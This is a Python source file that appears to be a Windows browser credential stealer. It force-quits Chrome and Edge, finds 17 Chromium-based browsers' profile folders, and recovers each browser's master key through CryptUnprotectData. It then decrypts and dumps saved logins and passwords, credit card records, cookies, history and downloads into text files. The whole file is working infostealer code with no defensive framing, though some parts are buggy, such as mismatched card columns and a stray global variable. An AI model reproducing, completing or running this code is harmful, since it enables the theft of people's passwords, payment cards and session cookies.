import base64
import json
import os
import sqlite3
from datetime import datetime, timedelta
import time
import psutil

def force_quit_browser_processes():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'chrome.exe' or proc.info['name'] == 'msedge.exe':
            proc.kill()

if __name__ == '__main__':
    # Force quit Chrome and Edge processes before proceeding
    force_quit_browser_processes()
    
    # Rest of the script continues here...


from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')

# Define paths to browser data directories
browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

# Define queries to extract different types of data from browser databases
data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': True
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': True
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return None

    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    if "os_crypt" not in local_state:
        return None

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return master_key

def decrypt_password(buff: bytes, key: bytes) -> str:
    if len(buff) == 0:
        print("Empty ciphertext found. Skipping decryption.")
        return ""

    if len(buff) < 16:
        print(f"Cipher text length: {len(buff)}")
        raise ValueError("Cipher text is too short")

    iv = buff[3:15]
    print(f"IV: {iv.hex()}")
    payload = buff[15:]

    if len(iv) != 12:
        print(f"IV length: {len(iv)}")
        raise ValueError("Invalid IV length")

    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.makedirs(browser_name)

    file_path = os.path.join(browser_name, f'{type_of_data}.txt')
    with open(file_path, 'w', encoding="utf-8") as f:
        if content is not None:
            f.write(content)
            print(f"\t [*] Saved in {file_path}")
        else:
            print(f"\t [-] No Data Found!")

def get_data_with_retry(path: str, profile: str, key, type_of_data):
    max_retries = 3
    retry_delay = 0.1  # Adjust as needed
    retry_count = 0

    while retry_count < max_retries:
        try:
            return get_data(path, profile, key, type_of_data)
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e):
                print("Database is locked. Retrying...")
                time.sleep(retry_delay)
                retry_count += 1
            else:
                raise e

    raise Exception("Max retries exceeded. Unable to retrieve data.")

def get_data(path: str, profile: str, key, type_of_data):
    db_file = os.path.join(path, f'{profile}{type_of_data["file"]}')
    if not os.path.exists(db_file):
        return None

    result = ""

    # Connect to the SQLite database file directly
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])

    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            row = [decrypt_password(cell, key) if isinstance(cell, bytes) else cell for cell in row]
            if data_type_name == 'history' and row[2] != 0:
                row[2] = convert_chrome_time(row[2])
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"

    # Close the SQLite connection
    conn.close()

    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    return [browser for browser, path in browsers.items() if os.path.exists(path)]

if __name__ == '__main__':
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if master_key is None:
            print(f"Master key not found for {browser}")
            continue

        print(f"Getting Stored Details from {browser}")
        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data_with_retry(browser_path, "Default", master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")